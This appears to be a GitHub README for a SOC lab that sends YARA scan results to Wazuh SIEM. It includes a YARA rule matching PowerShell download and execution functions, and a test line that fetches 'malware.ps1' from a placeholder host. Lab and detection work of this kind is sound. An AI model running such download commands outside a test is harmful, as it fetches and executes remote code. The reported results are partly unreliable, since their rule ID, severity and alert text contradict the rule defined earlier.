Integrating YARA Threat Hunting with Wazuh SIEM for Malware Detection

Author: Babatunde Qodri – SOC Analyst

This project demonstrates how YARA, a powerful open-source malware pattern-matching tool, can be seamlessly integrated with Wazuh SIEM to detect and respond to malicious activities in real time.

The setup simulates a real-world Security Operations Center (SOC) within a safe lab environment, combining endpoint threat hunting, log analysis, and alert correlation across multiple virtual machines.

<img width="976" height="658" alt="image4" src="https://github.com/user-attachments/assets/3fdcc0af-9bd2-474c-b6e3-7cc295c07830" />

📘 Overview – What I Built and Why

Threat actors continuously evolve their tactics to evade detection. This project was designed to showcase how open-source tools like YARA and Wazuh can work together to improve malware detection and visibility in a SOC environment.

Using custom YARA rules, I simulated the detection of malicious PowerShell activity and configured Wazuh SIEM to receive, analyze, and visualize alerts in real time.

Through this hands-on implementation, I strengthened my skills in:

Threat Hunting · SIEM Integration · Endpoint Monitoring · Incident Detection & Response

⚙️ Architecture Diagram

Figure 1: Workflow showing Windows Agent (YARA + Wazuh Agent) sending detection logs to Wazuh Manager (Ubuntu), which displays alerts on the SIEM dashboard.

💻 Setup & Configuration
Environment Overview
Component	Description
Windows 10 VM	Acts as the monitored endpoint running YARA scans
Ubuntu Server	Hosts the Wazuh Manager and SIEM dashboard
PowerShell	Automates YARA scans and log generation
YARA v4.5.4	Performs rule-based malware pattern detection
Wazuh SIEM	Correlates logs and visualizes detections
EICAR File	Safe test file for malware simulation
Step 1 – YARA Installation
# Install YARA in Windows
C:\Tools\YARA\yara

# Verify installation
& "C:\Tools\YARA\yara\yara64.exe" --version

Step 2 – Create Custom YARA Rule
# Create a YARA test folder
mkdir C:\YARA_Test

# Create and edit custom rule
notepad C:\YARA_Test\custom_rule.yar


Rule logic example:

rule Suspicious_PowerShell_Script
{
    strings:
        $a = "Invoke-WebRequest"
        $b = "FromBase64String"
        $c = "Start-Process"
    condition:
        any of them
}


This rule detects PowerShell scripts containing suspicious functions often used in malware or attack scripts.

Step 3 – Create and Scan Test Script
# Create test script
notepad C:\YARA_Test\test_script.ps1

# Add this line
Invoke-WebRequest -Uri "http://example.com/malware.ps1"

# Execute scan
& "C:\Tools\YARA\yara\yara64.exe" C:\YARA_Test\custom_rule.yar C:\YARA_Test


✅ Result: YARA successfully identified suspicious patterns, validating the rule’s detection logic.

🧪 Detection Simulation – Integrating YARA with Wazuh
Step 1 – Redirect YARA Output to Wazuh Agent Logs
mkdir "C:\Program Files (x86)\ossec-agent\yara_logs"
& "C:\Tools\YARA\yara\yara64.exe" C:\YARA_Test\custom_rule.yar C:\YARA_Test > "C:\Program Files (x86)\ossec-agent\yara_logs\yara_output.log"

Step 2 – Create Custom Wazuh Rule
<group name="yara,">
    <rule id="110050" level="10">
        <decoded_as>yara</decoded_as>
        <description>YARA Detection: Suspicious PowerShell Script</description>
        <group>yara,malware-detection,</group>
        <match>Suspicious_PowerShell_Script</match>
    </rule>
</group>


Save as:
/var/ossec/etc/rules/yara_custom_rules.xml

Validate syntax:

sudo /var/ossec/bin/wazuh-logtest

📊 Results / Dashboard Analysis

✅ Detection Summary

Stage	Description
YARA	Detected suspicious PowerShell string patterns
Wazuh Agent	Forwarded YARA detection logs
Wazuh Manager	Parsed and matched custom rule ID 110051
SIEM Dashboard	Displayed “Possible malware detected by YARA” alert

Figure 2: High-severity (Level 12) alert confirming successful integration between YARA and Wazuh.

🔍 Incident Summary
Time	Rule ID	Severity	Description	Action Taken
2025-10-29 13:37	110051	12 (High)	Possible malware detected by YARA	Verified and validated rule correlation
💡 Challenges & Lessons Learned

Challenge: Initial rule misconfiguration prevented Wazuh from parsing YARA logs.
Solution: Adjusted log path and validated XML syntax with wazuh-logtest.

Lesson: Learned how to write and tune custom Wazuh rules for alert correlation.

Outcome: Gained deep insight into endpoint-to-SIEM data flow and detection logic.

🚀 Future Enhancements

Integrate AlienVault OTX for automatic threat intelligence enrichment.

Expand detection coverage using Sigma or Suricata rules.

Automate YARA scanning using PowerShell task scheduler.

🧰 Tools Used
Tool	Purpose
YARA v4.5.4	Malware pattern matching
Wazuh SIEM	Log correlation and visualization
PowerShell	Log automation and script execution
Ubuntu Server	Wazuh Manager host
Windows 10 VM	Endpoint for YARA testing
EICAR Test File	Safe malware simulation
📚 References

VirusTotal YARA Repository

Wazuh Documentation

EICAR Test File

MITRE ATT&CK Framework

🧩 Professional Takeaway

This project demonstrates full end-to-end SOC workflow — from detection logic to alert validation — proving practical capability in:

Endpoint security monitoring

SIEM correlation

Custom rule engineering

Threat simulation and analysis

“From detection to alert — this is what SOC Analysts do daily.”

✅ Folder Structure Reference
Integrating-YARA-with-Wazuh/
├── README.md
├── docs/
│   ├── architecture_diagram.png
│   ├── wazuh_dashboard_alert.png
│   └── incident_table.png
├── rules/
│   └── yara_custom_rules.xml
├── logs/
│   └── yara_output.log
